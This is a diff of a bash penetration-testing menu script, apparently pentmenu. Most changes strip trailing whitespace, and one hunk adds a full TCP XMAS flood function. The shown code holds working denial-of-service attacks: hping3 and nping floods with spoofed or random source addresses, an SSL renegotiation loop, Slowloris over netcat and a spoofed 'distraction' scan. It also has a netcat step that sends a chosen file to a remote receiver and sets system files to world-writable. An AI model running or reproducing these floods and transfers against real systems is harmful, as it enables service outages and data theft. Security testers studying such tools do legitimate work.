@@ -22,7 +22,7 @@ dosmenu
 extractionmenu
   	elif [ "$opt" = "View Readme" ]; then
 showreadme
-	else 
+	else
 #if no valid option is chosen, chastise the user
 	echo "That's not a valid option! Hit Return to show main menu"
 	fi
@@ -62,7 +62,7 @@ reconmenu()
 #Check uptime of server
     elif [ "$reconopt" = "Check Server Uptime" ]; then
         checkuptime
-#Go back		
+#Go back
 	elif [ "$reconopt" = "Go back" ]; then
 		mainmenu
 ## Default if no menu option selected is to return an error
@@ -141,7 +141,7 @@ echo "Depending on the target, the scan might take a long time to finish"
 echo "Please enter the target host/IP/subnet:"
 #we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
 read -i $TARGET -e TARGET
-echo "Enter the speed of scan (0 means very slow and 5 means fast).  
+echo "Enter the speed of scan (0 means very slow and 5 means fast).
 Slower scans are more subtle, but faster means less waiting around.
 Default is 3:"
 #How fast should we scan the target?
@@ -164,7 +164,7 @@ echo "This scan might take a very long time to finish, please be patient"
 echo "Enter the hostname/IP/subnet to scan:"
 #need a target hostname/IP
 read -i $TARGET -e TARGET
-echo "Enter the speed of scan (0 means very slow and 5 means fast).  
+echo "Enter the speed of scan (0 means very slow and 5 means fast).
 Slower scans are more subtle, but faster means less waiting around.
 Default is 3:"
 #How fast should we scan the target?
@@ -187,7 +187,7 @@ echo "Enter the host/subnet to scan:"
 read -i $TARGET -e TARGET
 #How fast should we scan the target?
 #Faster speed is more likely to be detected by IDS, but is less waiting around
-echo "Enter the speed of scan (0 means very slow and 5 means fast).  
+echo "Enter the speed of scan (0 means very slow and 5 means fast).
 Slower scans are more subtle, but faster means less waiting around.
 Default is 3:"
 read -i $SPEED -e SPEED
@@ -241,7 +241,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 dosmenu()
 {
 #display a menu for the DOS module using bash select
-		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "UDP Flood" "SSL DOS" "Slowloris" "Distraction Scan" "Go back")
+		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "Distraction Scan" "Go back")
 	select dosopt in "${dosmenu[@]}"; do
 #TCP SYN Flood DOS
  	if [ "$dosopt" = "TCP SYN Flood" ]; then
@@ -252,7 +252,10 @@ dosmenu()
 #TCP RST Flood
 	elif [ "$dosopt" = "TCP RST Flood" ]; then
 		rstflood
-#UDP Flood		
+#TCP XMAS Flood
+  elif [ "$dosopt" = "TCP XMAS Flood" ]; then
+		xmasflood
+#UDP Flood
  	elif [ "$dosopt" = "UDP Flood" ]; then
 		udpflood
 #SSL DOS
@@ -261,10 +264,10 @@ dosmenu()
 #Slowloris
 	elif [ "$dosopt" = "Slowloris" ]; then
 		slowloris
-#Distraction scan 
+#Distraction scan
 	elif [ "$dosopt" = "Distraction Scan" ]; then
 		distractionscan
-#Go back	
+#Go back
 	elif [ "$dosopt" = "Go back" ]; then
 		mainmenu
 	else
@@ -307,7 +310,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	read -i $SENDDATA -e SENDDATA
 	: ${SENDDATA:=n}
 	if [[ $SENDDATA = y ]]; then
-#we've chosen to send data, so how much should we send?  
+#we've chosen to send data, so how much should we send?
 	echo "Enter number of data bytes to send (default 3000):"
 	read -i $DATA -e DATA
 	: ${DATA:=3000}
@@ -316,7 +319,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
 	fi
 #if $SENDDATA is not equal to y (yes) then send no data
-	else DATA=0 
+	else DATA=0
 	fi
 #start TCP SYN flood using values defined earlier
 #note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
@@ -409,7 +412,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	read -i $SENDDATA -e SENDDATA
 	: ${SENDDATA:=n}
 	if [[ $SENDDATA = y ]]; then
-#we've chosen to send data, so how much should we send?  
+#we've chosen to send data, so how much should we send?
 	echo "Enter number of data bytes to send (default 3000):"
 	read -i $DATA -e DATA
 	: ${DATA:=3000}
@@ -418,7 +421,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
 	fi
 #if $SENDDATA is not equal to y (yes) then send no data
-	else DATA=0 
+	else DATA=0
 	fi
 #start TCP ACK flood using values defined earlier
 #note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
@@ -511,7 +514,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	read -i $SENDDATA -e SENDDATA
 	: ${SENDDATA:=n}
 	if [[ $SENDDATA = y ]]; then
-#we've chosen to send data, so how much should we send?  
+#we've chosen to send data, so how much should we send?
 	echo "Enter number of data bytes to send (default 3000):"
 	read -i $DATA -e DATA
 	: ${DATA:=3000}
@@ -520,7 +523,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
 	fi
 #if $SENDDATA is not equal to y (yes) then send no data
-	else DATA=0 
+	else DATA=0
 	fi
 #start TCP RST flood using values defined earlier
 #note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
@@ -580,6 +583,106 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	fi
 }
 ##END TCPRSTFLOOD##
+###################
+
+#####################
+##START TCPXMASFLOOD##
+xmasflood()
+{		echo "TCP XMAS Flood uses hping3...checking for hping3..."
+	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+#hping3 is found, so use that for TCP XMAS Flood
+		echo "Enter target:"
+#need a target IP/hostname
+	read -i $TARGET -e TARGET
+#need a port to send TCP XMAS packets to
+		echo "Enter target port (defaults to 80):"
+	read -i $PORT -e PORT
+	: ${PORT:=80}
+#check a valid integer is given for the port, anything else is invalid
+	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+PORT=80 && echo "Invalid port, reverting to port 80"
+	elif [ "$PORT" -lt "1" ]; then
+PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+	elif [ "$PORT" -gt "65535" ]; then
+PORT=80 && echo "Invalid port chosen! Reverting to port 80"
+	else echo "Using Port $PORT"
+	fi
+#What source address to use? Manually defined, or random, or outgoing interface IP?
+		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+	read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#should any data be sent with the XMAS packet?  Default is to send no data
+	echo "Send data with XMAS packet? [y]es or [n]o (default)"
+	read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+	if [[ $SENDDATA = y ]]; then
+#we've chosen to send data, so how much should we send?
+	echo "Enter number of data bytes to send (default 3000):"
+	read -i $DATA -e DATA
+	: ${DATA:=3000}
+#If not an integer is entered, use default
+	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
+	fi
+#if $SENDDATA is not equal to y (yes) then send no data
+	else DATA=0
+	fi
+#start TCP XMAS flood using values defined earlier
+	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+	elif [ "$SOURCE" = "r" ]; then
+		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+	elif [ "$SOURCE" = "i" ]; then
+		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+	else echo "Not a valid option!  Using interface IP"
+		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
+	fi
+#No hping3 so using nping for TCP RST Flood
+	else echo "hping3 not found :( trying nping instead"
+		echo ""
+		echo "Trying TCP XMAS Flood with nping..this will work but is not ideal"
+#need a valid target ip/hostname
+		echo "Enter target:"
+	read -i $TARGET -e TARGET
+#need a valid target port
+		echo "Enter target port (defaults to 80):"
+	read -i $PORT -e PORT
+	: ${PORT:=80}
+#check a valid integer is given for the port, anything else is invalid
+	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+PORT=80 && echo "Invalid port, reverting to port 80"
+	elif [ "$PORT" -lt "1" ]; then
+PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+	elif [ "$PORT" -gt "65535" ]; then
+PORT=80 && echo "Invalid port chosen! Reverting to port 80"
+	else echo "Using Port $PORT"
+	fi
+#define source IP or use outgoing interface IP
+		echo "Enter Source IP or use [i]nterface IP (default):"
+	read -i $SOURCE -e SOURCE
+		: ${SOURCE:=i}
+#How many packets to send per second?  default is 10k
+		echo "Enter number of packets to send per second (default is 10,000):"
+	read RATE
+		: ${RATE:=10000}
+#how many packets in total to send?
+#default is 100k, so using default values will send 10k packets per second for 10 seconds
+		echo "Enter total number of packets to send (default is 100,000):"
+	read TOTAL
+		: ${TOTAL:=100000}
+		echo "Starting TCP XMAS Flood..."
+#begin TCP RST flood using values defined earlier
+	if 	[ "$SOURCE" = "i" ]; then
+		sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
+	else sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+	fi
+	fi
+}
+##END TCPXMASFLOOD##
 ###################
 
 ##################
@@ -664,7 +767,7 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 #what data should we send with each packet?
 #curently only accepts stdin.  Can't define a file to read from
 		echo "Enter string to send (data):"
-	read DATA	
+	read DATA
 		echo "Starting UDP Flood..."
 #start the UDP flood using values we defined earlier
 	if 	[ "$SOURCE" = "i" ]; then
@@ -678,7 +781,7 @@ fi
 
 ################
 ##START SSLDOS##
-ssldos() 
+ssldos()
 { echo "Using openssl for SSL/TLS DOS"
 		echo "Enter target:"
 #need a target IP/hostname
@@ -687,8 +790,8 @@ ssldos()
 		echo "Enter target port (defaults to 443):"
 read -i $PORT -e PORT
 : ${PORT:=443}
-#check a valid target port is entered otherwise assume port 443 
-if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
+#check a valid target port is entered otherwise assume port 443
+if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
 	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
 fi
 if [ "$PORT" -lt "1" ]; then
@@ -703,22 +806,22 @@ read NEGOTIATE
 : ${NEGOTIATE:=n}
 if [[ $NEGOTIATE = y ]]; then
 #if client renegotiation is selected for use, launch the attack supporting it
-	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
-while : for i in {1..10} 
-	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
 done
 elif [[ $NEGOTIATE = n ]]; then
 #if client renegotiation is not requested, lauch the attack without support for it
-	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
-while : for i in {1..10} 
-	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
 done
 #if an invalid option is chosen for client renegotiation, launch the attack without it
-else 
+else
 	echo "Invalid option, assuming no client renegotiation"
-	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
-while : for i in {1..10} 
-	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
+while : for i in {1..10}
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
 done
 fi
 #The SSL/TLS DOS code is crude but it can be brutally effective
@@ -769,7 +872,7 @@ then
 #if default (random) interval is chosen, generate a random value between 5 and 15
 #note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
 INTERVAL=$((RANDOM % 11 + 5))
-#check that r (random) or a valid number is entered 
+#check that r (random) or a valid number is entered
 	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
 then
 #if not r (random) or valid number is chosen for interval, assume r (random)
@@ -778,14 +881,14 @@ INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value betw
 #run stunnel_client function
 stunnel_client
 if [[ "$SSL" = "y" ]]
-then 
+then
 #if SSL is chosen, set the attack to go through local stunnel listener
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
 echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
-else 
+else
 #if SSL is not chosen, launch the attack on the server without using a local listener
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
@@ -811,7 +914,7 @@ echo "Enter spoofed source address:"
 read -i $SOURCE -e SOURCE
 #use hping to perform multiple obvious TCP SYN scans
 for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
-exit 0 
+exit 0
 }
 ##END DISTRACTION##
 ###################
@@ -879,8 +982,8 @@ PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 echo "Sending the file to $RECEIVER:$PORT"
 if [ "$PROTO" = "t" ]; then
 nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
-else 
-nc -n -N -u $RECEIVER $PORT < $EXTRACT 
+else
+nc -n -N -u $RECEIVER $PORT < $EXTRACT
 fi
 echo "Done"
 #generate hashes of file we are sending
@@ -907,26 +1010,26 @@ if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
 fi
 #show listening ports on system using ss (if available) otherwise use netstat
 	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
-if test -f "/bin/ss"; then 
-	LISTPORT=ss; 
+if test -f "/bin/ss"; then
+	LISTPORT=ss;
 	else LISTPORT=netstat
 
 fi
 #now we can ask what port to create listener on
 #it cannot of course listen on a port already in use
-	$LISTPORT -$PROTO -n -l 
+	$LISTPORT -$PROTO -n -l
 echo "Enter port number to listen on (defaults to 8000):"
 	read -i $PORT -e PORT
 	: ${PORT:=8000}
 #if not an integer is entered, assume default port 8000
-if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
+if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
 		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
 fi
 #ensure a valid port number, between 1 and 65,535 (inclusive) is entered
 if [ "$PORT" -lt "1" ]; then
 		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
 	elif [ "$PORT" -gt "65535" ]; then
-		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000" 
+		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
 fi
 #define where to save everything received to the listener
 echo "Enter output file (defaults to pentmenu.listener.out):"
@@ -975,7 +1078,7 @@ curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md |
 ##GENERIC##
 #################
 ##START STUNNEL##
-stunnel_client() 
+stunnel_client()
 { echo "use SSL/TLS? [y]es or [n]o (default):"
 	read SSL
 	: ${SSL:=n}
@@ -992,8 +1095,8 @@ then
 echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
 fi
 #is ss is available, use that to shoew listening ports
-if test -f "/bin/ss"; then 
-	LISTPORT=ss; 
+if test -f "/bin/ss"; then
+	LISTPORT=ss;
 #otherwise use netstat
 	else LISTPORT=netstat
 fi
@@ -1002,7 +1105,7 @@ $LISTPORT -tln |grep -q $LPORT
 if [[ "$?" = "1" ]]
 #if nothing is running on port 9991, create stunnel configuration
 then
-	echo "Creating stunnel client on $LHOST:$LPORT"	
+	echo "Creating stunnel client on $LHOST:$LPORT"
 		sudo rm -f /etc/stunnel/pentmenu.conf;
 		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
 		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
